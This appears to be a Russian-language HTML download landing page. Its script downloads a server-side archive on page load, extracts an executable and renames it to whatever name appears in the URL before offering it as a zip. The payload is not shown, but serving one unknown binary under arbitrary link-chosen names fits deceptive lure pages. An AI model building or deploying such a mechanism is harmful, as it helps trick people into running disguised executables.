<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      background: #0f1115;
      color: #e8eaed;
      padding: 1.5rem;
    }
    .card {
      max-width: 28rem;
      text-align: center;
      padding: 2rem;
      border-radius: 12px;
      background: #1a1d24;
      border: 1px solid #2a2f3a;
    }
    h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 0.75rem; }
    p { color: #9aa0a6; font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.25rem; }
    .filename {
      display: inline-block;
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      font-size: 0.9rem;
      color: #8ab4f8;
      background: #0f1115;
      padding: 0.35rem 0.6rem;
      border-radius: 6px;
      margin-bottom: 1.25rem;
      word-break: break-all;
    }
    button, a.button {
      display: inline-block;
      border: none;
      cursor: pointer;
      background: #8ab4f8;
      color: #0f1115;
      font-weight: 600;
      font-size: 0.95rem;
      padding: 0.65rem 1.25rem;
      border-radius: 8px;
      text-decoration: none;
    }
    button:hover, a.button:hover { filter: brightness(1.08); }
    button:disabled { opacity: 0.6; cursor: wait; }
    .status { margin-top: 1rem; font-size: 0.85rem; color: #9aa0a6; min-height: 1.25em; }
    .status.error { color: #f28b82; }
  </style>
  <!-- JSZip: распаковка archive.zip в браузере -->
  <script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>
</head>
<body>
  <div class="card">
    <h1>Скачивание файла</h1>
    <p>Если загрузка не началась автоматически, нажмите кнопку ниже.</p>
    <div class="filename" id="filename">…</div>
    <div>
      <button type="button" id="downloadBtn">Скачать</button>
    </div>
    <p class="status" id="status">Подготовка загрузки…</p>
  </div>

  <script>
    (function () {
      // ZIP на сервере; .exe внутри (archive.exe) извлекается на клиенте
      var ZIP_URL = "/archive.zip";
      var INNER_EXE = "archive.exe";

      function getBaseName() {
        var path = (window.location.pathname || "").replace(/\/+$/, "");
        var segment = path.split("/").filter(Boolean).pop() || "download";
        segment = segment
          .replace(/[\\/:*?"<>|]/g, "-")
          .replace(/\.+$/, "")
          .trim();
        if (!segment) segment = "download";
        // Убираем .exe / .zip, если уже есть — добавим сами
        segment = segment.replace(/\.(exe|zip)$/i, "");
        if (!segment) segment = "download";
        return segment;
      }

      var baseName = getBaseName();
      var exeName = baseName + ".exe";
      var zipName = baseName + ".zip";

      var filenameEl = document.getElementById("filename");
      var statusEl = document.getElementById("status");
      var btn = document.getElementById("downloadBtn");

      // Пользователь получает ZIP с именем из URL; внутри — .exe с тем же базовым именем
      filenameEl.textContent = zipName + " → " + exeName;

      function setStatus(text, isError) {
        statusEl.textContent = text;
        statusEl.className = "status" + (isError ? " error" : "");
      }

      function triggerDownload(blob, name) {
        var url = URL.createObjectURL(blob);
        var a = document.createElement("a");
        a.href = url;
        a.download = name;
        a.rel = "noopener";
        document.body.appendChild(a);
        a.click();
        a.remove();
        setTimeout(function () {
          URL.revokeObjectURL(url);
        }, 2000);
      }

      function findExeEntry(zip) {
        // 1) точное имя archive.exe
        if (zip.file(INNER_EXE)) return zip.file(INNER_EXE);

        // 2) archive.exe в любой папке
        var names = Object.keys(zip.files);
        for (var i = 0; i < names.length; i++) {
          var n = names[i];
          var entry = zip.files[n];
          if (entry.dir) continue;
          var leaf = n.split("/").pop();
          if (leaf.toLowerCase() === INNER_EXE) return entry;
        }

        // 3) первый .exe в архиве
        for (var j = 0; j < names.length; j++) {
          var n2 = names[j];
          var entry2 = zip.files[n2];
          if (!entry2.dir && /\.exe$/i.test(n2)) return entry2;
        }

        return null;
      }

      async function downloadArchive() {
        if (typeof JSZip === "undefined") {
          setStatus("Не загрузилась библиотека JSZip. Проверьте сеть / CDN.", true);
          return;
        }

        btn.disabled = true;
        setStatus("Загрузка archive.zip…");

        try {
          var response = await fetch(ZIP_URL, { cache: "no-cache" });
          if (!response.ok) {
            throw new Error("HTTP " + response.status + " при загрузке " + ZIP_URL);
          }

          setStatus("Распаковка…");
          var zipData = await response.arrayBuffer();
          var sourceZip = await JSZip.loadAsync(zipData);

          var exeEntry = findExeEntry(sourceZip);
          if (!exeEntry) {
            throw new Error("В archive.zip не найден " + INNER_EXE);
          }

          var exeBlob = await exeEntry.async("blob");

          // Собираем новый ZIP без сжатия (STORE):
          // имя архива и .exe внутри — из URL (например test-v2.zip → test-v2.exe)
          setStatus("Подготовка " + zipName + "…");
          var outZip = new JSZip();
          outZip.file(exeName, exeBlob, {
            compression: "STORE",
            binary: true
          });

          var outBlob = await outZip.generateAsync({
            type: "blob",
            compression: "STORE",
            mimeType: "application/zip"
          });

          triggerDownload(outBlob, zipName);
          setStatus("Файл «" + zipName + "» (внутри «" + exeName + "») должен скачаться.");
        } catch (err) {
          console.error(err);
          setStatus(
            (err && err.message) || "Ошибка. Нажмите кнопку ещё раз.",
            true
          );
        } finally {
          btn.disabled = false;
        }
      }

      btn.addEventListener("click", downloadArchive);
      downloadArchive();
    })();
  </script>
</body>
</html>
